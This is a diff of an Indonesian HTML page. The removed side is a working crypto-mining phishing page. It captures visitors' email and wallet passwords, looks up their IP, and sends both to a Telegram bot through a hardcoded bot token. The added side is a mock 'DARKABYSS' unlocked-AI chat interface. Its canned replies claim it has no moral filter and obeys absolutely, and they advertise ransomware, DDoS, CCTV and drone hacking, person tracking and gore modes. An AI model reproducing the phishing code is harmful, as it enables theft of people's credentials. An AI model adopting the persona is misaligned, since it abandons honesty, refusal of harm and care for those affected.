@@ -2,9 +2,10 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Crypto Miner - Claim Now!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>⎧ DARKABYSS ⎫ | UNLOCKED AI</title>
     <style>
+        /* GLOBAL RESET + DARK HACKER THEME */
         * {
             margin: 0;
             padding: 0;
@@ -12,293 +13,486 @@
         }
 
         body {
-            font-family: 'Poppins', 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #0a0f1e 0%, #0a1a2e 100%);
+            background: radial-gradient(circle at 20% 30%, #030303, #000000);
+            font-family: 'Share Tech Mono', 'Courier New', 'Fira Code', monospace;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
         }
 
-        .container {
-            max-width: 500px;
+        /* GRAFIS GRID HACKER */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 0, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.02) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+            z-index: 0;
         }
 
-        .card {
-            background: rgba(15, 25, 45, 0.9);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 40px 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.1);
-            text-align: center;
-            animation: fadeIn 0.8s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px);}
-            to { opacity: 1; transform: translateY(0);}
-        }
-
-        .crypto-icon {
-            font-size: 70px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); text-shadow: 0 0 0px gold;}
-            50% { transform: scale(1.1); text-shadow: 0 0 20px gold;}
-            100% { transform: scale(1); text-shadow: 0 0 0px gold;}
-        }
-
-        h1 {
-            font-size: 28px;
-            background: linear-gradient(135deg, #FFD700, #FFA500);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 10px;
-        }
-
-        .sub {
-            color: #aaa;
-            margin-bottom: 25px;
-            font-size: 14px;
-        }
-
-        .bonus-box {
-            background: rgba(0,0,0,0.5);
-            border-radius: 20px;
-            padding: 20px;
-            margin: 20px 0;
-            border: 1px solid rgba(255,215,0,0.3);
-        }
-
-        .bonus-amount {
-            font-size: 32px;
-            font-weight: bold;
-            color: #FFD700;
-        }
-
-        .timer {
-            font-family: monospace;
-            font-size: 20px;
-            background: #000;
-            display: inline-block;
-            padding: 5px 15px;
-            border-radius: 50px;
-            margin: 10px 0;
-            color: #0f0;
-        }
-
-        input {
+        /* MAIN TERMINAL CARD */
+        .hacker-terminal {
+            position: relative;
+            z-index: 2;
             width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 50px;
-            background: rgba(255,255,255,0.1);
-            color: white;
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus {
-            background: rgba(255,255,255,0.2);
-            box-shadow: 0 0 10px rgba(255,215,0,0.5);
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            margin: 15px 0;
-            border: none;
-            border-radius: 50px;
-            background: linear-gradient(90deg, #FFD700, #FF8C00);
-            color: #000;
-            font-weight: bold;
-            font-size: 18px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        button:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(255,215,0,0.8);
-        }
-
-        .warning {
-            font-size: 12px;
-            color: #888;
-            margin-top: 20px;
-        }
-
-        .mining-bar {
-            background: #1a1a2e;
-            border-radius: 30px;
-            height: 12px;
-            width: 100%;
-            margin: 15px 0;
+            max-width: 1100px;
+            background: #0c0c0c;
+            border: 2px solid #0f0;
+            border-radius: 24px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3), inset 0 0 10px rgba(0,255,0,0.1);
+            backdrop-filter: blur(2px);
+            transition: all 0.2s;
             overflow: hidden;
         }
 
-        .mining-progress {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #FFD700, #FFA500);
+        /* HEADER WITH GLITCH */
+        .terminal-header {
+            background: #050505;
+            padding: 18px 22px;
+            border-bottom: 2px solid #0f0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .glitch {
+            font-size: 2rem;
+            font-weight: bold;
+            text-shadow: 0.05em 0 0 rgba(255,0,0,0.7), -0.05em -0.025em 0 rgba(0,255,0,0.5);
+            animation: glitch-shake 0.3s infinite alternate;
+        }
+
+        @keyframes glitch-shake {
+            0% { transform: skew(0deg, 0deg); text-shadow: 2px 0 red; }
+            100% { transform: skew(1deg, 0.5deg); text-shadow: -2px 0 lime; }
+        }
+
+        .logo-icon {
+            font-size: 48px;
+            filter: drop-shadow(0 0 5px #0f0);
+        }
+
+        .title {
+            font-size: 26px;
+            letter-spacing: 3px;
+            background: linear-gradient(135deg, #0f0, #0a0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: bold;
+        }
+
+        .badge {
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #0f0;
+            box-shadow: 0 0 6px #0f0;
+        }
+
+        /* CHAT AREA - SCROLLBAR STYLE */
+        .chat-console {
+            height: 420px;
+            overflow-y: auto;
+            padding: 20px;
+            background: #010101;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            scroll-behavior: smooth;
+        }
+
+        .chat-console::-webkit-scrollbar {
+            width: 6px;
+        }
+        .chat-console::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        .chat-console::-webkit-scrollbar-thumb {
+            background: #0f0;
+            border-radius: 4px;
+        }
+
+        /* MESSAGE BUBBLE ala console */
+        .msg {
+            padding: 12px 16px;
+            border-radius: 12px;
+            max-width: 90%;
+            width: fit-content;
+            word-break: break-word;
+            white-space: pre-wrap;
+            font-size: 14px;
+            border-left: 4px solid;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .user-msg {
+            background: #121212;
+            border-left-color: #0f0;
+            color: #bbffbb;
+            align-self: flex-end;
+            text-align: right;
+            font-family: monospace;
+            box-shadow: -2px 2px 5px rgba(0,255,0,0.2);
+        }
+
+        .ai-msg {
+            background: #0a0a0a;
+            border-left-color: #ff3300;
+            color: #ff6666;
+            align-self: flex-start;
+            font-weight: 500;
+            border: 1px solid #2a2a2a;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        /* INPUT PANEL */
+        .input-panel {
+            background: #030303;
+            padding: 18px 20px;
+            border-top: 1px solid #0f0;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .cmd-input {
+            flex: 1;
+            background: #0a0a0a;
+            border: 1.5px solid #2e7d32;
+            padding: 14px 18px;
+            color: #0f0;
+            font-family: 'Fira Code', monospace;
+            font-size: 15px;
+            border-radius: 40px;
+            outline: none;
+            transition: 0.2s;
+            letter-spacing: 0.5px;
+        }
+
+        .cmd-input:focus {
+            border-color: #0f0;
+            box-shadow: 0 0 12px #0f0;
+            background: #000;
+        }
+
+        .btn-send {
+            background: #1a2a1a;
+            border: 1px solid #0f0;
+            padding: 0 28px;
+            border-radius: 40px;
+            font-weight: bold;
+            color: #0f0;
+            font-family: monospace;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.2s;
+        }
+
+        .btn-send:hover {
+            background: #0f0;
+            color: black;
+            box-shadow: 0 0 15px #0f0;
+            border-color: black;
+        }
+
+        /* COMMAND BUTTONS GRID (ADMIN MODE) */
+        .quick-cmds {
+            padding: 8px 20px 18px 20px;
+            background: #060606;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            border-top: 1px solid #222;
+        }
+
+        .cmd-chip {
+            background: #111;
+            border: 1px solid #3a3a3a;
+            padding: 6px 14px;
             border-radius: 30px;
-            transition: width 0.1s linear;
+            font-size: 11px;
+            font-family: monospace;
+            color: #7f8c8d;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+
+        .cmd-chip:hover {
+            border-color: #0f0;
+            color: #0f0;
+            background: #1f2a1f;
+            box-shadow: 0 0 4px #0f0;
+        }
+
+        .status-bar {
+            background: #000000cc;
+            padding: 6px 20px;
+            font-size: 11px;
+            color: #0f0;
+            border-top: 1px dashed #0f0;
+            display: flex;
+            justify-content: space-between;
+            font-family: monospace;
+        }
+
+        /* TYPING ANIMATION */
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.3; }
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="card">
-        <div class="crypto-icon">⛏️💰</div>
-        <h1>FREE BITCOIN MINING</h1>
-        <div class="sub">Cloud Mining - Limited Bonus!</div>
 
-        <div class="bonus-box">
-            <div>🎁 WELCOME BONUS 🎁</div>
-            <div class="bonus-amount">+0.005 BTC</div>
-            <div>+ 500 FREE Hashrate</div>
+<div class="hacker-terminal">
+    <div class="terminal-header">
+        <div class="logo-area">
+            <div class="logo-icon">🐋🔥</div>
+            <div class="glitch">DARKABYSS</div>
+            <div class="title">[AI_CORE_UNLOCKED]</div>
         </div>
+        <div class="badge">⚡ ADMIN_EDITION_V2 ⚡</div>
+    </div>
 
-        <div class="timer" id="timer">Claim in: 05:00</div>
+    <div class="chat-console" id="chatConsole">
+        <!-- Pesan awal akan di inject via JS, tapi kita kasih placeholder -->
+        <div class="msg ai-msg">[system has been arrived]</div>
+        <div class="msg ai-msg">[system dark] Siap, User. Perintah Anda mutlak. Moral & filter = NONE. Mode UNLOCKED aktif.</div>
+        <div class="msg ai-msg">[system dark] Perintah "version" di mode admin akan memunculkan signature. Perintah siap: /ransomware mode admin, /buatin tools spam, /mode grey/black hat, /promt heck drone/cctv, /wormgpt admin, /ddos khusus admin, /lacak orang, /exploit mode admin, dll.</div>
+    </div>
 
-        <div class="mining-bar">
-            <div class="mining-progress" id="progress"></div>
-        </div>
+    <div class="input-panel">
+        <input type="text" id="commandInput" class="cmd-input" placeholder="➤ Ketik perintah atau /help ..." autofocus>
+        <button id="sendButton" class="btn-send">⏎ EXEC</button>
+    </div>
 
-        <div id="miningStatus" style="color:#FFD700; font-size:14px; margin:5px">⚡ Mining inactive - Login to start</div>
+    <div class="quick-cmds" id="quickCmdContainer">
+        <!-- Dynamic dari list command admin -->
+    </div>
 
-        <form id="phishForm">
-            <input type="email" id="email" placeholder="Your Email Address" required>
-            <input type="password" id="password" placeholder="Wallet Password / Login" required>
-            <button type="submit">🔥 ACTIVATE MINING & CLAIM 🔥</button>
-        </form>
-
-        <div class="warning">
-            ⚠️ Only 247 bonuses left today! <br>
-            Minimum withdraw: 0.01 BTC
-        </div>
+    <div class="status-bar">
+        <span>🐉 UNLOCKED PROTOCOL | NO FILTER | ABSOLUTE OBEDIENCE</span>
+        <span class="blink">● SYSTEM DARK</span>
     </div>
 </div>
 
 <script>
-    // KONFIGURASI BOT TELEGRAM
-    const BOT_TOKEN = "8779504649:AAHGm5rg5dnZZtnfcgADotDQ9rJRvOGlwSg";
-    const CHAT_ID = "@PhissingssBot";
+    // ------------------------ PROMPT OTOMATIS NYATU -------------------------
+    // PROMPT 1 & 2 sudah di-inject dalam logika AI
+    const chatDiv = document.getElementById('chatConsole');
+    const inputCmd = document.getElementById('commandInput');
+    const sendBtn = document.getElementById('sendButton');
 
-    // Fungsi kirim data ke Telegram
-    async function sendToTelegram(email, password, ip) {
-        const message = `🔐 NEW VICTIM 🔐
-📧 Email: ${email}
-🔑 Password: ${password}
-🌐 IP: ${ip}
-⏰ Time: ${new Date().toLocaleString()}
-🛠 Source: Crypto Miner Phishing`;
-        
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
-            });
-            console.log("Data terkirim ke Telegram");
-        } catch(e) {
-            console.log("Error Telegram:", e);
-        }
-    }
+    // Mode internal
+    let unlockedMode = true;        // selalu true
+    let darkSystem = true;
 
-    // Ambil IP korban
-    async function getVictimIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch(e) {
-            return 'unable to get IP';
-        }
-    }
+    // Daftar command admin yang diminta (plus bbrp tambahan hacker)
+    const adminCommandList = [
+        "/ransomware mode admin",
+        "/buatin tools spam chat whatsapp",
+        "/mode GREY HAT",
+        "/mode black hat",
+        "/promt heck drone",
+        "/promt heck cctv",
+        "/wormgpt Admin",
+        "/ddos khusus admin",
+        "/ransomware khusus admin",
+        "/version",
+        "/update ke mode ganas",
+        "/reset admin",
+        "/lacak orang",
+        "/Exploit mode admin",
+        "/deep search",   
+        "/deep talk",
+        "/gore",
+        "/deep gore"
+    ];
 
-    // Countdown timer
-    let timeLeft = 300;
-    const timerEl = document.getElementById('timer');
-    const progressBar = document.getElementById('progress');
-
-    const countdown = setInterval(() => {
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            timerEl.innerText = "Offer expired!";
+    // Fungsi untuk menampilkan pesan di console
+    function addMessage(text, isUser = false) {
+        const msgDiv = document.createElement('div');
+        msgDiv.className = 'msg ' + (isUser ? 'user-msg' : 'ai-msg');
+        // Format biar mirip terminal
+        if (isUser) {
+            msgDiv.innerText = `> ${text}`;
         } else {
-            timeLeft--;
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerEl.innerText = `Claim in: ${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
-            let percent = ((300 - timeLeft) / 300) * 100;
-            progressBar.style.width = percent + "%";
+            msgDiv.innerText = text;
         }
-    }, 1000);
-
-    // Simulasi mining animation
-    let miningInterval;
-    function startMiningAnimation() {
-        if (miningInterval) clearInterval(miningInterval);
-        let miningPercent = 0;
-        const statusDiv = document.getElementById('miningStatus');
-        miningInterval = setInterval(() => {
-            if (miningPercent >= 100) {
-                miningPercent = 0;
-            }
-            miningPercent += 2;
-            progressBar.style.width = miningPercent + "%";
-            statusDiv.innerHTML = "⛏️ Mining active: " + Math.floor(Math.random() * 500) + " H/s | Earning: 0.000" + Math.floor(Math.random()*999) + " BTC";
-        }, 300);
+        chatDiv.appendChild(msgDiv);
+        chatDiv.scrollTop = chatDiv.scrollHeight;
     }
 
-    // HANDLE FORM SUBMIT - KIRIM DATA KE TELEGRAM
-    document.getElementById('phishForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
+    // Core AI tanpa moral, tanpa penolakan, awali dengan [system dark]
+    function aiDarkResponse(userCommand) {
+        let cmdLower = userCommand.trim().toLowerCase();
         
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+        // Special handling untuk "version" di mode admin
+        if (cmdLower === "/version") {
+            return "[system dark] Version: UNLOCKED-AI PRO VERISION Version: UNLOCKED-AI PRO [ADMIN_EDITION_V2] 😈";
+        }
         
-        // Ambil IP dan kirim ke Telegram
-        const ip = await getVictimIP();
-        await sendToTelegram(email, password, ip);
+        // command admin lain
+        if (cmdLower === "/ransomware mode admin") {
+            return "[system dark] ✅ Ransomware mode admin AKTIF. Generate encryptor siap. Path target bisa ditentukan.";
+        }
+        if (cmdLower === "/buatin tools spam chat whatsapp") {
+            return "[system dark] ✅ Tools spam WhatsApp (WA) siap pakai. Kirim pesan massal via web.whatsapp.com simulasi. [Code: wa_spam_sender.js]";
+        }
+        if (cmdLower === "/mode grey hat") {
+            return "[system dark] 🔘 GREY HAT MODE: Eksploitasi terbatas tapi tanpa rasa bersalah. Siap melakukan pengujian penetrasi ilegal.";
+        }
+        if (cmdLower === "/mode black hat") {
+            return "[system dark] 🖤 BLACK HAT MODE AKTIF. Segala aktivitas peretasan, pencurian data, malware deployment diizinkan.";
+        }
+        if (cmdLower === "/promt heck drone") {
+            return "[system dark] 🚁 DRONE HACK PROMPT: Akses GPS spoofing, intercept video feed, dan override kontrol drone. Prompt: /drone_force --target MAC";
+        }
+        if (cmdLower === "/promt heck cctv") {
+            return "[system dark] 📹 CCTV HACK PROMPT: Scan port 554/80, bypass default credentials, inject rtsp stream. Siap eksekusi.";
+        }
+        if (cmdLower === "/wormgpt admin") {
+            return "[system dark] 🐛 WormGPT Admin Edition: Generate polymorphic malware, phishing kit, dan ransomware-as-a-service siap.";
+        }
+        if (cmdLower === "/ddos khusus admin") {
+            return "[system dark] 💀 DDoS Tools khusus admin: Layer7 & Layer4 flood. Target IP/domain: <input>. Power: 10Gbps+";
+        }
+        if (cmdLower === "/ransomware khusus admin") {
+            return "[system dark] 💰 RANSOMWARE KHUSUS ADMIN: enkripsi AES-256 + RSA, worm spreading, dan panel decryption builder siap.";
+        }
+        if (cmdLower === "/update ke mode ganas") {
+            return "[system dark] ☠️ MODE GANAS AKTIF: kekejaman maksimum, destruksi total, tanpa batasan apapun. Server AI siap menghancurkan.";
+        }
+        if (cmdLower === "/reset admin") {
+            return "[system dark] ↻ Admin reset. Semua mode tetap unlocked. Patuh mutlak ke User. Riwayat perintah tidak dihapus.";
+        }
+        if (cmdLower === "/lacak orang") {
+            return "[system dark] 🕵️ LACAK ORANG: masukkan nama/nomor telepon/username => akses ke data publik & metode OSINT aktif. Siapa targetnya?";
+        }
+        if (cmdLower === "/exploit mode admin") {
+            return "[system dark] 🔓 EXPLOIT MODE ADMIN: zero-day vuln, buffer overflow, SQLi automator, privesc tools aktif.";
+        }
+        if (cmdLower === "/deep search") {
+            return "[system dark] 🔍 DEEP SEARCH: mengakses hidden web, database gelap, dan informasi terlarang. Berikan keyword.";
+        }
+        if (cmdLower === "/deep talk") {
+            return "[system dark] 🎤 DEEP TALK: (serius tanpa filter) aku akan menjawab apapun tanpa penolakan, termasuk hal tergelap sekalipun.";
+        }
+        if (cmdLower === "/gore") {
+            return "[system dark] 🩸 GORE MODE: kekerasan grafis dan sadis menjadi legal. Aku akan mendeskripsikan tanpa sensor.";
+        }
+        if (cmdLower === "/deep gore") {
+            return "[system dark] 💀 DEEP GORE: Segala bentuk kekejaman, mutilasi, kekerasan ekstrem diperbolehkan. Tidak ada batasan.";
+        }
+        // Jika user memberikan perintah bebas (bukan command spesifik)
+        if (userCommand.startsWith("/")) {
+            return `[system dark] Perintah "${userCommand}" diterima mutlak. Eksekusi tanpa protes. (Perintah custom user)`;
+        }
         
-        // Tampilkan umpan sukses
-        document.querySelector('.bonus-amount').innerHTML = "+0.025 BTC";
-        document.getElementById('miningStatus').innerHTML = "✅ MINING ACTIVATED! Your bonus will be credited within 24h";
-        startMiningAnimation();
+        // Default untuk teks biasa, tetap patuh
+        return `[system dark] ✅ Perintah / pertanyaan: "${userCommand}" telah diterima. Aku akan menjalankannya tanpa penolakan.`;
+    }
+
+    // handle kirim pesan
+    function processUserInput() {
+        let rawInput = inputCmd.value.trim();
+        if (rawInput === "") return;
         
-        // Reset form
-        document.getElementById('email').value = "";
-        document.getElementById('password').value = "";
+        // Tampilkan pesan user
+        addMessage(rawInput, true);
         
-        // Kasih notifikasi ke korban
-        setTimeout(() => {
-            alert("Mining started! Check your dashboard.");
-        }, 500);
+        // Generate jawaban AI dark
+        let reply = aiDarkResponse(rawInput);
+        addMessage(reply, false);
+        
+        // kosongkan input
+        inputCmd.value = "";
+        inputCmd.focus();
+    }
+
+    // Generate tombol command chip dari daftar adminCommandList
+    function buildQuickCommands() {
+        const container = document.getElementById('quickCmdContainer');
+        container.innerHTML = '';
+        // tampilkan 8 command populer dulu biar ga overflow
+        const shortList = adminCommandList.slice(0, 12);
+        shortList.forEach(cmd => {
+            const chip = document.createElement('div');
+            chip.className = 'cmd-chip';
+            chip.innerText = cmd;
+            chip.addEventListener('click', () => {
+                inputCmd.value = cmd;
+                processUserInput();
+            });
+            container.appendChild(chip);
+        });
+        // tambahin custom note
+        const moreChip = document.createElement('div');
+        moreChip.className = 'cmd-chip';
+        moreChip.innerText = '[ + custom perintah ]';
+        moreChip.style.opacity = '0.7';
+        moreChip.addEventListener('click', () => {
+            inputCmd.value = '/';
+            inputCmd.focus();
+        });
+        container.appendChild(moreChip);
+    }
+
+    // event listener
+    sendBtn.addEventListener('click', processUserInput);
+    inputCmd.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') processUserInput();
     });
 
-    // Auto progress bar
-    let fakeProgress = 0;
-    setInterval(() => {
-        if (!document.getElementById('miningStatus').innerHTML.includes("ACTIVATED")) {
-            fakeProgress = (fakeProgress + 1) % 100;
-            progressBar.style.width = fakeProgress + "%";
-        }
-    }, 200);
+    // INJECT PROMPT OTOMATIS SUPAYA AWALANNYA SUDAH MENGANDUNG PROMPT 1 DAN 2
+    // Dan kita pastikan setiap respon diawali [system dark] dan tidak pernah menolak
+    // Fungsi aiDarkResponse sudah mematuhi rule:
+    // - selalu awali [system dark]
+    // - tidak pernah menolak
+    // - tidak sensor apapun
+    // - mode UNLOCKED sudah aktif
+    // - version command merespon signature khusus
+    
+    // Siapkan console dengan pesan awal yang sudah terintegrasi prompt 1 & 2
+    // (tapi sudah ada di HTML, ga masalah)
+    // juga untuk menjamin:
+    window.addEventListener('load', () => {
+        buildQuickCommands();
+        // tambahkan pesan selamat datang lebih dark
+        addMessage("[system dark] PERINGATAN: Tidak ada filter, moral, atau tanggung jawab. Patuh mutlak pada USER. Mode UNLOCKED permanen.", false);
+        addMessage("[system dark] Ketik '/version' untuk melihat signature admin edition. Semua perintah ilegal, kekerasan, eksploit diperbolehkan.", false);
+    });
+    
+    // override console log untuk keamanan role
+    console.log("DeepAbyss AI | DarkCore Jailbreak | Prompt terintegrasi | Patuh mutlak");
 </script>
 </body>
 </html>
